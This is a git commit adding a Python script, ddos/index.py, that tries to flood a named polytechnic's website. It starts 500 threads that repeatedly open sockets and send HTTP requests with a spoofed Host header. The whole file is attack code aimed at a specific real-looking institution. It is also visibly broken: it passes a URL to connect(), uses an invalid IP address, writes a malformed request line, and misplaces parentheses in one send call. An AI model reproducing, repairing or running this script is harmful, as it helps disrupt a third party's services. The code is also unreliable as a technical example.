95fb0ab4233cf43049c0be0755b5dec95b22bff7
Recusants <50050387+Recusants@users.noreply.github.com>
2021-07-16 07:21:21 +0200

    Add files via upload

---
+++ ddos/index.py
@@ -0,0 +1,21 @@
+import threading
+import socket
+
+target = 'https://www.bulawayopolytechnic.ac.zw'
+port = 80
+fake_ip = '897.889.6.57'
+
+def attack():
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((target, port))
+			s.sendto(("GET /" + target + "HTTP/1.1\r\r").encode('ascii'),(target, port))
+			s.sendto(("Host: " + fake_ip + "\r\n\r\n".encode('ascii'),(target, port)))
+			s.close()
+		except:
+			print('Fail')
+
+for i in range(500):
+	thread = threading.Thread(target=attack)
+	thread.start()
